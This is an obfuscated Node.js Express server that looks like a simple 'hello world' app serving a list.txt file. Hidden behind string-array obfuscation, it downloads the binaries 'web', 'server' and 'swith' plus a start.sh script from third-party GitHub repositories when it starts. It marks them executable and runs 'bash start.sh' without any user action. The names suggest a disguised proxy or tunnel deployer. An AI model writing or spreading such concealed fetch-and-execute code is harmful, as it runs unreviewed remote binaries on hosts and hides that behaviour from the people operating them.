const _0x11c863=_0x1a17;(function(_0x221ac5,_0x25cad5){const _0x4dacd8=_0x1a17,_0x29811f=_0x221ac5();while(!![]){try{const _0x3791cc=-parseInt(_0x4dacd8(0xbe))/0x1+parseInt(_0x4dacd8(0xc4))/0x2+-parseInt(_0x4dacd8(0xc9))/0x3*(parseInt(_0x4dacd8(0xc7))/0x4)+parseInt(_0x4dacd8(0xb7))/0x5*(-parseInt(_0x4dacd8(0xc6))/0x6)+-parseInt(_0x4dacd8(0xb8))/0x7+-parseInt(_0x4dacd8(0xbc))/0x8+parseInt(_0x4dacd8(0xba))/0x9*(parseInt(_0x4dacd8(0xc0))/0xa);if(_0x3791cc===_0x25cad5)break;else _0x29811f['push'](_0x29811f['shift']());}catch(_0x1470b4){_0x29811f['push'](_0x29811f['shift']());}}}(_0x4222,0x2ad27));const port=process[_0x11c863(0xd2)][_0x11c863(0xdd)]||0xbb8,express=require('express'),app=express(),exec=require(_0x11c863(0xd6))['exec'],fs=require('fs'),path=require(_0x11c863(0xbf)),axios=require(_0x11c863(0xd4)),os=require('os');app[_0x11c863(0xe4)]('/',function(_0x5b9724,_0x1fb318){const _0x55984e=_0x11c863;_0x1fb318['send'](_0x55984e(0xb4));}),app[_0x11c863(0xe4)]('/list',(_0x357ad9,_0x59e71c)=>{const _0x228ead=_0x11c863;fs[_0x228ead(0xc8)](_0x228ead(0xd0),'utf8',(_0x110c91,_0x55f19b)=>{const _0xf8d0fb=_0x228ead;_0x110c91?(console[_0xf8d0fb(0xcb)](_0x110c91),_0x59e71c['status'](0x1f4)['json']({'error':'Error\x20reading\x20list.txt'})):_0x59e71c['status'](0xc8)[_0xf8d0fb(0xab)](_0x55f19b);});}),app[_0x11c863(0xe4)]('/sub',(_0x4b77d5,_0x22b9d7)=>{const _0x5e7b9e=_0x11c863;fs[_0x5e7b9e(0xc8)](_0x5e7b9e(0xd0),_0x5e7b9e(0xe5),(_0x16f8a8,_0x4d99b1)=>{const _0x3a5bb1=_0x5e7b9e;_0x16f8a8?(console[_0x3a5bb1(0xcb)](_0x16f8a8),_0x22b9d7[_0x3a5bb1(0xd8)](0x1f4)[_0x3a5bb1(0xaf)]({'error':'Error\x20reading\x20list.txt'})):(_0x22b9d7['setHeader'](_0x3a5bb1(0xcc),_0x3a5bb1(0xd1)),_0x22b9d7[_0x3a5bb1(0xd8)](0xc8)[_0x3a5bb1(0xab)](_0x4d99b1));});});function getSystemArchitecture(){const _0x59c11d=_0x11c863,_0x2b1e43=os[_0x59c11d(0xac)]();return _0x2b1e43===_0x59c11d(0xce)||_0x2b1e43===_0x59c11d(0xb9)?_0x59c11d(0xce):'amd';}function _0x4222(){const _0x25eeed=['chmod','axios','catch','child_process','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','status','pipe','then','fileUrl','\x20failed','PORT','fileName','https://github.com/eoovve/test/raw/main/swith','length','Failed\x20to\x20set\x20permissions\x20for\x20','createWriteStream','log','get','utf8','server','close','finish','swith','https://github.com/eoovve/test/releases/download/ARM/swith','send','arch','listen','\x20successfully','json','data','start.sh','bash\x20start.sh','https://github.com/eoovve/test/raw/main/server','hello\x20world','https://github.com/eoovve/test/raw/main/web','forEach','115xsOaMt','2141181TiyApO','arm64','6957DQorjT','join','1749176lEgrRY','Download\x20','126247qjmNmm','path','13630eytXmc','stream','https://github.com/eoovve/test/releases/download/ARM/server','All\x20files\x20downloaded','109282OxvcFx','amd','18162RQctjE','1364ZOwLEg','readFile','1869ThSNLU','https://github.com/eoovve/test/releases/download/ARM/web','error','Content-Type','web','arm','Server\x20is\x20running\x20on\x20port\x20','list.txt','application/octet-stream','env'];_0x4222=function(){return _0x25eeed;};return _0x4222();}function downloadFile(_0x30af4e,_0x4837ed,_0x4b53f2){const _0x3fc1f8=_0x11c863;axios({'method':_0x3fc1f8(0xe4),'url':_0x4837ed,'responseType':_0x3fc1f8(0xc1)})[_0x3fc1f8(0xda)](_0x497cb7=>{const _0xbaf1b9=_0x3fc1f8,_0x83e00d=fs[_0xbaf1b9(0xe2)](path[_0xbaf1b9(0xbb)]('./',_0x30af4e));_0x497cb7[_0xbaf1b9(0xb0)][_0xbaf1b9(0xd9)](_0x83e00d),_0x83e00d['on'](_0xbaf1b9(0xa8),function(){const _0x530c4a=_0xbaf1b9;_0x83e00d[_0x530c4a(0xa7)](),fs[_0x530c4a(0xd3)](path['join']('./',_0x30af4e),0x1fd,function(_0x27d3db){const _0x691151=_0x530c4a;_0x27d3db?_0x4b53f2(_0x691151(0xe1)+_0x30af4e):_0x4b53f2(null,_0x30af4e);});});})[_0x3fc1f8(0xd5)](_0x1a7341=>{_0x4b53f2('Download\x20'+_0x30af4e+'\x20file\x20failed');});}function getFilesForArchitecture(_0x2cecb8){const _0x1bfb53=_0x11c863;if(_0x2cecb8===_0x1bfb53(0xce))return[{'fileName':_0x1bfb53(0xcd),'fileUrl':_0x1bfb53(0xca)},{'fileName':_0x1bfb53(0xa9),'fileUrl':_0x1bfb53(0xaa)},{'fileName':'server','fileUrl':_0x1bfb53(0xc2)},{'fileName':_0x1bfb53(0xb1),'fileUrl':'https://github.com/chengdada123/Argo-for-Saclingo/releases/download/V1.0/start.sh'}];else{if(_0x2cecb8===_0x1bfb53(0xc5))return[{'fileName':'web','fileUrl':_0x1bfb53(0xb5)},{'fileName':_0x1bfb53(0xa9),'fileUrl':_0x1bfb53(0xdf)},{'fileName':_0x1bfb53(0xa6),'fileUrl':_0x1bfb53(0xb3)},{'fileName':_0x1bfb53(0xb1),'fileUrl':'https://github.com/chengdada123/Argo-for-Saclingo/releases/download/V1.0/start.sh'}];}return[];}function _0x1a17(_0x11fc46,_0x3d1136){const _0x42228a=_0x4222();return _0x1a17=function(_0x1a17e3,_0x207ea5){_0x1a17e3=_0x1a17e3-0xa6;let _0x3eeca2=_0x42228a[_0x1a17e3];return _0x3eeca2;},_0x1a17(_0x11fc46,_0x3d1136);}function downloadAndRunFiles(){const _0x41036a=_0x11c863,_0x41c768=getSystemArchitecture(),_0x4e7585=getFilesForArchitecture(_0x41c768);if(_0x4e7585['length']===0x0){console[_0x41036a(0xe3)](_0x41036a(0xd7));return;}let _0x35543b=0x0;_0x4e7585[_0x41036a(0xb6)](_0x2aa047=>{const _0x1b9b3d=_0x41036a;downloadFile(_0x2aa047[_0x1b9b3d(0xde)],_0x2aa047[_0x1b9b3d(0xdb)],(_0x497033,_0x521094)=>{const _0x5d3a02=_0x1b9b3d;_0x497033?console[_0x5d3a02(0xe3)](_0x5d3a02(0xbd)+_0x521094+_0x5d3a02(0xdc)):console['log'](_0x5d3a02(0xbd)+_0x521094+_0x5d3a02(0xae)),_0x35543b++,_0x35543b===_0x4e7585[_0x5d3a02(0xe0)]&&(console[_0x5d3a02(0xe3)](_0x5d3a02(0xc3)),exec(_0x5d3a02(0xb2),function(_0x5332de,_0x36ce6f,_0x3d353b){const _0x1db2f5=_0x5d3a02;if(_0x5332de){console[_0x1db2f5(0xcb)](_0x5332de);return;}console[_0x1db2f5(0xe3)](_0x36ce6f);}));});});}downloadAndRunFiles(),app[_0x11c863(0xad)](port,()=>console[_0x11c863(0xe3)](_0x11c863(0xcf)+port+'!'));
